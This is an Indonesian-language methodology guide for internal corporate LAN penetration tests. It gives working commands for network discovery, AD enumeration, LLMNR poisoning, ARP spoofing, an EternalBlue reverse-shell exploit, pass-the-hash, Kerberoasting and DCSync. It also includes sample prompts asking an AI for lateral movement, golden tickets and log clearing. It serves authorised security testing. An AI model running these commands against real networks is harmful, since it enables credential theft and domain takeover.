# Network Pentest: Internal LAN (Jaringan Korporat)

**Target:** Jaringan internal perusahaan — workstation, server, AD, printer, dsb  
**Akses tester:** Fisik di lokasi atau koneksi ke switch/port jaringan  
**Durasi:** 5–10 hari (tergantung ukuran jaringan)

---

## Skenario Umum

| Sub-skenario | Kondisi Awal |
|-------------|-------------|
| Black Box | Hanya dapat port RJ45, tidak tahu topologi |
| Grey Box | Tahu subnet, punya akun domain user biasa |
| White Box | Punya network diagram, akun admin, credential semua device |

---

## Phase 1: Network Discovery

```bash
# Identifikasi subnet dan gateway
ip route
arp -a

# Sweep seluruh network — temukan semua host
sudo netdiscover -r 192.168.1.0/24
sudo arp-scan -l
nmap -sn 192.168.1.0/24 -oN recon/host_discovery.txt

# Scan lebih agresif jika jaringan besar
masscan -p1-65535 192.168.1.0/24 --rate=500 \
  -oL recon/masscan_results.txt
```

**Prompt Claude Code:**
```
Saya baru terhubung ke jaringan internal korporat (IP saya: 192.168.1.105).
Output netdiscover: [OUTPUT]
Output nmap host discovery: [OUTPUT]

Analisis:
1. Identifikasi device berdasarkan MAC/hostname (server, printer, workstation, network device)
2. Subnet mana yang paling menarik untuk diprioritaskan?
3. Apakah ada tanda-tanda Domain Controller (AD)?
4. Langkah discovery lanjutan yang disarankan
```

---

## Phase 2: Service Enumeration

```bash
# Full service scan semua host yang ditemukan
nmap -sV -sC -p- 192.168.1.0/24 \
  --open --min-rate 1000 \
  -oN scans/full_service_scan.txt \
  -oX scans/full_service_scan.xml

# Fokus port kritis jaringan internal
nmap -sV -p 22,23,25,53,80,88,135,139,389,443,445,636,1433,3306,3389,5985,8080 \
  192.168.1.0/24 -oN scans/critical_ports.txt

# SMB enumeration
nmap --script smb-vuln*,smb-enum-shares,smb-enum-users \
  -p 445 192.168.1.0/24
```

**Prompt Claude Code:**
```
Nmap scan jaringan internal 192.168.1.0/24 menemukan:

Host aktif: 47 host
Port terbuka yang sering muncul: 445 (SMB), 3389 (RDP), 80/443, 22

Interesting hosts:
- 192.168.1.1: port 80,443,22 — likely router/firewall
- 192.168.1.10: port 88,389,445,3389 — kemungkinan Domain Controller
- 192.168.1.50-100: port 445,3389 — workstation Windows
- 192.168.1.200: port 3306,8080 — kemungkinan database+web server

Buat attack plan terurut berdasarkan prioritas.
```

---

## Phase 3: Active Directory Enumeration

AD adalah target utama di jaringan korporat — jika AD dikuasai, semua sistem dikuasai.

```bash
# Enum4linux — SMB & LDAP enumeration
enum4linux -a 192.168.1.10 > recon/enum4linux_dc.txt

# CrackMapExec — Swiss army knife untuk AD
crackmapexec smb 192.168.1.0/24          # host discovery via SMB
crackmapexec smb 192.168.1.10 -u '' -p ''  # null session
crackmapexec smb 192.168.1.0/24 --shares  # list semua share

# Impacket — LDAP dump
python3 ldapdomaindump.py -u 'DOMAIN\user' -p 'password' 192.168.1.10

# BloodHound — visualisasi attack path AD
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 -c all
```

**Prompt Claude Code:**
```
Berhasil enumerate Active Directory di domain CORP.LOCAL.

Dari ldapdomaindump:
- Domain users: 245 akun
- Domain admins: 8 akun
- Komputer di domain: 87 host
- Password policy: min 8 karakter, lockout setelah 5 attempt
- Akun dengan "Don't require Kerberos preauthentication": 3 akun
- Akun dengan SPN (Service Principal Name): 12 akun

Dari hasil ini, identifikasi:
1. Attack path yang paling menjanjikan
2. Akun mana yang rentan AS-REP Roasting?
3. Akun mana yang rentan Kerberoasting?
4. Apakah ada misconfiguration yang umum?
```

---

## Phase 4: Network-Level Attacks

### LLMNR/NBT-NS Poisoning (Responder)

```bash
# Responder — capture NTLMv2 hash dari broadcast request
sudo python3 Responder.py -I eth0 -wrf
# Tunggu user access network share → tangkap hash

# Crack hash yang didapat
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
# atau
john --format=netntlmv2 captured_hashes.txt --wordlist=rockyou.txt
```

### MITM dengan Bettercap

```bash
# ARP poisoning untuk MITM
sudo bettercap -iface eth0
# Di bettercap console:
net.probe on
set arp.spoof.targets 192.168.1.50
arp.spoof on
net.sniff on
```

**Prompt Claude Code:**
```
Responder berhasil capture hash dari jaringan internal:

[*] NTLMv2-SSP Hash captured from 192.168.1.55:
CORP\john.doe::CORP:1122334455667788:ABC123DEF456:...

Buatkan:
1. Command hashcat untuk crack NTLMv2 hash ini
2. Cara pass-the-hash jika crack gagal (PTH attack)
3. Cara gunakan credential untuk lateral movement ke host lain
4. Bagaimana cara mencegah LLMNR poisoning (untuk laporan rekomendasi)
```

---

## Phase 5: SMB Vulnerabilities

```bash
# Cek EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.0/24

# Metasploit — EternalBlue
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.55
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.105
run

# Cek SMB signing (wajib untuk relay attack)
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

---

## Phase 6: Lateral Movement

```bash
# Pass-the-Hash dengan CrackMapExec
crackmapexec smb 192.168.1.0/24 \
  -u administrator -H <NTLM_HASH> \
  --local-auth

# WMIExec — remote code execution
python3 wmiexec.py CORP/administrator:password@192.168.1.10

# PSExec — remote shell
python3 psexec.py CORP/administrator:password@192.168.1.10

# PsExec via Metasploit
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass password
```

**Prompt Claude Code:**
```
Berhasil akses ke workstation 192.168.1.55 (Windows 10) via EternalBlue.
Meterpreter session aktif sebagai: NT AUTHORITY\SYSTEM

Buatkan post-exploitation plan untuk jaringan AD:
1. Dump local credentials (mimikatz hashdump)
2. Cari cached domain credentials di memori
3. Identifikasi dan akses Domain Controller
4. DCSync attack untuk dump semua hash domain
5. Golden ticket untuk persistent access
6. Cara mencakup jejak (log clearing)
```

---

## Phase 7: Domain Privilege Escalation

```bash
# Kerberoasting — request TGS untuk akun dengan SPN
python3 GetUserSPNs.py CORP.LOCAL/user:pass -dc-ip 192.168.1.10 -request \
  -outputfile kerberoast_hashes.txt

# Crack Kerberos hash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting — untuk akun tanpa preauthentication
python3 GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -no-pass \
  -dc-ip 192.168.1.10 -outputfile asrep_hashes.txt

# DCSync — dump semua hash domain (butuh Domain Admin atau replication rights)
python3 secretsdump.py CORP/administrator:password@192.168.1.10
```

---

## Checklist Internal LAN Pentest

```
[ ] Network discovery (semua subnet)
[ ] Service enumeration (nmap full port)
[ ] SMB enumeration (shares, users, null session)
[ ] AD enumeration (users, groups, GPO, trust)
[ ] Responder / LLMNR poisoning
[ ] Cek EternalBlue (MS17-010), ZeroLogon, PrintNightmare
[ ] Kerberoasting & AS-REP Roasting
[ ] Pass-the-Hash / Pass-the-Ticket
[ ] Lateral movement ke host lain
[ ] Domain privilege escalation
[ ] DCSync / Golden Ticket (jika target adalah AD)
[ ] Pivot ke subnet tersegmentasi
[ ] Laporan: attack path + mitigasi tiap langkah
```

---

## Durasi Estimasi

| Sub-skenario | Durasi |
|-------------|-----------|----------|
| Black Box (tidak tahu topologi) | 5–7 hari | 10–14 hari |
| Grey Box (punya akun domain) | 3–5 hari | 7–10 hari |
| White Box (punya semua info) | 5–8 hari | 12–18 hari |

*White box lebih lama karena cakupan review lebih menyeluruh (semua GPO, AD config, dsb)*
